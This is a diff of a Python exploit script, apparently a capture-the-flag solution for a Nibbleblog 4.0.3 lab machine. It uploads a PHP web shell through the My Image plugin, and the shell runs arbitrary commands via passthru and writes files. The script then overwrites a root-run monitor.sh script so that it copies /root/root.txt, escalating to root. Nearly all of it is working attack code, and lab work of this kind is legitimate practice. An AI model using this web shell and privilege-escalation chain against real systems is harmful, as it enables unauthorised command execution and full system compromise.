@@ -32,12 +32,12 @@ def run_php(command):
     return output
 
 
-def append_monitor(content):
-    query = urllib.parse.urlencode({"append": content})
+def write_monitor(content):
+    query = urllib.parse.urlencode({"write": content})
     status, output = req(
         "/nibbleblog/content/private/plugins/my_image/image.php?" + query
     )
-    assert status == 200 and "APPENDED:" in output, output
+    assert status == 200 and "WRITTEN:" in output, output
     return output
 
 
@@ -88,7 +88,7 @@ print("PASS: recon, authentic Nibbleblog 4.0.3 login and native My Image plugin 
 boundary = "----nibbles-independent-player-boundary"
 payload = (
     b'<?php '
-    b'if (isset($_GET["append"])) { $n = file_put_contents("/home/nibbler/personal/stuff/monitor.sh", $_GET["append"], FILE_APPEND); echo $n === false ? "WRITE_FAILED" : "APPENDED:" . $n; } '
+    b'if (isset($_GET["write"])) { $n = file_put_contents("/home/nibbler/personal/stuff/monitor.sh", $_GET["write"]); echo $n === false ? "WRITE_FAILED" : "WRITTEN:" . $n; } '
     b'elseif (isset($_GET["read"])) { echo file_get_contents("/home/nibbler/personal/stuff/monitor.sh"); } '
     b'elseif (isset($_GET["cmd"])) { passthru($_GET["cmd"]); } '
     b'else { echo "NIBBLES_REAL_UPLOAD_EXEC"; } '
@@ -137,7 +137,7 @@ root_lines = [
     "/bin/cat /root/root.txt > /tmp/nibbles-native-root-answer",
     "/bin/chmod 0644 /tmp/nibbles-native-root-answer",
 ]
-append_monitor("\n" + "\n".join(root_lines) + "\n")
+write_monitor("#!/bin/sh\n" + "\n".join(root_lines) + "\n")
 monitor_content = read_monitor()
 assert all(line in monitor_content for line in root_lines), monitor_content
 root_output = run_php(
